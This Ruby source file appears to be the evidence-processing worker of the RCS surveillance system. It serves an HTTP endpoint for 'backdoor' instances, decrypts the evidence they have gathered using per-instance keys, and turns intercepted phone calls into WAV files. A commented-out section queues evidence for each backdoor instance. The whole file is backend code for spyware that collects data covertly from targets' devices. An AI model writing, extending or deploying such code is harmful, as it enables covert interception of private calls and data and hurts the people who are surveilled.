#
# The main file of the worker
#

# relatives
require_relative 'audio_processor'
require_relative 'config'
require_relative 'evidence/call'
require_relative 'parser'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/evidence'
require 'rcs-common/evidence_manager'

# form System
require 'digest/md5'
require 'optparse'

require 'eventmachine'
require 'evma_httpserver'

module RCS
module Worker

Thread.abort_on_exception=true

class HTTPHandler < EM::Connection
  include RCS::Tracer
  include EM::HttpServer
  include Parser

  def post_init
    # don't forget to call super here !
    super
    
    # to speed-up the processing, we disable the CGI environment variables
    self.no_environment_strings
    
    # set the max content length of the POST
    self.max_content_length = 30 * 1024 * 1024
    
    # get the peer name
    @peer_port, @peer = Socket.unpack_sockaddr_in(get_peername)
    trace :debug, "Connection from #{@peer}:#{@peer_port}"
  end

def process_http_request
    # the http request details are available via the following instance variables:
    #   @http_protocol
    #   @http_request_method
    #   @http_cookie
    #   @http_if_none_match
    #   @http_content_type
    #   @http_path_info
    #   @http_request_uri
    #   @http_query_string
    #   @http_post_content
    #   @http_headers

    trace :debug, "[#{@peer}] Incoming HTTP Connection"
    trace :debug, "[#{@peer}] Request: [#{@http_request_method}] #{@http_request_uri}"

    resp = EM::DelegatedHttpResponse.new(self)

    # Block which fulfills the request
    operation = proc do

      # do the dirty job :)
      # here we pass the control to the internal parser which will return:
      #   - the content of the reply
      #   - the content_type
      #   - the cookie if the backdoor successfully passed the auth phase
      begin
        status, content, content_type = http_parse(@http_headers.split("\x00"), @http_request_method, @http_request_uri, @http_cookie, @http_post_content)
      rescue Exception => e
        trace :error, "ERROR: " + e.message
        trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
      end
      
      # prepare the HTTP response
      resp.status = status
      #TODO: status_string from status
      resp.status_string = "OK"
      resp.content = content
      resp.headers['Content-Type'] = content_type
      resp.headers['Connection'] = 'close'
    end
    
    # Callback block to execute once the request is fulfilled
    callback = proc do |res|
    	resp.send_response
    end

    # Let the thread pool handle request
    EM.defer(operation, callback)
  end

end
=begin
class EvidenceWorker
  include Tracer
  
  SLEEP_TIME = 10
  
  def initialize(instance)
    @instance = instance
    @state = :stopped
    @evidences = []
    trace :info, "Issuing worker for backdoor instance #{instance}."
  end
  
  def stopped?
    @state == :stopped
  end

  def sleeping_too_much?
    
  end
    
  def queue(evidence)
    
    # queue the evidence
    #trace :info, "queueing #{evidence} for #{@instance}"
    @evidences << evidence

    # prepare the Proc used for handling the deferred work
    process = Proc.new do
      @state = :running
      seconds_sleeping = 0
      trace :debug, "[#{Thread.current}][#{@instance}] starting processing."

      while seconds_sleeping < SLEEP_TIME
        until @evidences.empty?
          trace :debug, "[#{Thread.current}][#{@instance}] evidences #{@evidences}"
          ev = @evidences.shift
          trace :debug, "[#{Thread.current}][#{@instance}] processing #{ev}."
          sleep 1
          seconds_sleeping = 0
        end

        sleep 1
        seconds_sleeping += 1
        trace :debug, "[#{Thread.current}] sleeping #{seconds_sleeping}"
      end
      
      trace :debug, "[#{Thread.current}][#{@instance}] sleeping too much, stopping!"
      @state = :stopped
    end
    
    # if the thread was sleeping, restart it
    if stopped?
      trace :debug, "deferring work for #{@instance}"
      EM.defer process
    end
  end
end

class EMPullHandler
  include Tracer
  
  attr_reader :received
  
  def initialize
    @workers = []
    @queue = {}
  end
  
  def on_readable(socket, messages)
    # each message is "<backdoor_instance>:<evidence_id>"
    trace :debug, "on_readable"
    messages.each do |m|
      msg = m.copy_out_string
      trace :debug, "received: #{msg}"
      instance, evidence = msg.split(":")

      unless @queue.has_key? instance
        worker = EvidenceWorker.new instance
        @workers << worker
        @queue[instance] = worker
      end
      
      @queue[instance].queue evidence
    end
  end
end
=end

class Worker
  include Tracer
  
  attr_reader :type, :audio_processor
  
  def setup(port = 5150)
    
    # main EventMachine loop
    begin
      
      # all the events are handled here
      EM::run do
        # if we have epoll(), prefer it over select()
        EM.epoll
        
        # set the thread pool size
        EM.threadpool_size = 50
        
        EM::start_server("127.0.0.1", port, HTTPHandler)
        trace :info, "Listening on port #{port}..."
        
      end
    rescue Exception => e
      # bind error
      if e.message.eql? 'no acceptor' then
        trace :fatal, "Cannot bind port #{Config.global['LISTENING_PORT']}"
        return 1
      end
      raise
    end
  
  end
    
  def process
    require 'pp'
    
    info = RCS::EvidenceManager.instance_info(@instance)
    trace :info, "Processing backdoor #{info['build']}:#{info['instance']}"
    
    # the log key is passed as a string taken from the db
    # we need to calculate the MD5 and use it in binary form
    trace :debug, "Evidence key #{info['key']}"
    evidence_key = Digest::MD5.digest info['key']
    
    evidence_sizes = RCS::EvidenceManager.evidence_info(@instance)
    evidence_ids = RCS::EvidenceManager.evidence_ids(@instance)
    trace :info, "Pieces of evidence to be processed: #{evidence_ids.join(', ')}."
    
    evidence_ids.each do |id|
      binary = RCS::EvidenceManager.get_evidence(id, @instance)
      trace :info, "Processing evidence #{id}: #{binary.size} bytes."
      
      # deserialize evidence
      begin
        evidence = RCS::Evidence.new(evidence_key).deserialize(binary)
        mod = "#{evidence.type.to_s.capitalize}Processing"
        evidence.extend eval mod if RCS.const_defined? mod.to_sym
        
        evidence.process if evidence.respond_to? :process
        
        case evidence.type
          when :CALL
            trace :debug, "Evidence channel #{evidence.channel} callee #{evidence.callee} with #{evidence.wav.size} bytes of data."
            @audio_processor.feed(evidence)
        end
      rescue EvidenceDeserializeError => e
        trace :info, "DECODING FAILED: " << e.to_s
        # trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
      rescue Exception => e
        trace :fatal, "FAILURE: " << e.to_s
        trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
      end
      
    end

    @audio_processor.to_wavfile
    
    trace :info, "All evidence has been processed."
  end
end

class Application
  include RCS::Tracer
  
  # To change this template use File | Settings | File Templates.
  def run(options) #, file)
    
    # if we can't find the trace config file, default to the system one
    if File.exist? 'trace.yaml' then
      typ = Dir.pwd
      ty = 'trace.yaml'
    else
      typ = File.dirname(File.dirname(File.dirname(__FILE__)))
      ty = typ + "/config/trace.yaml"
      #puts "Cannot find 'trace.yaml' using the default one (#{ty})"
    end
    
    # ensure the log directory is present
    Dir::mkdir(Dir.pwd + '/log') if not File.directory?(Dir.pwd + '/log')
    
    # initialize the tracing facility
    begin
      trace_init typ, ty
    rescue Exception => e
      puts e
      exit
    end
    
    begin
      version = File.read(Dir.pwd + '/config/version.txt')
      trace :info, "Starting a RCS Worker #{version}..."
      
      # config file parsing
      return 1 unless Config.load_from_file
      
      Worker.new.setup Config.global['LISTENING_PORT']
    rescue Exception => e
      trace :fatal, "FAILURE: " << e.to_s
      trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
      return 1
    end
    
    return 0
  end
  
  # we instantiate here an object and run it
  def self.run!(*argv)
    return Application.new.run argv
  end
end

end # Worker::
end # RCS::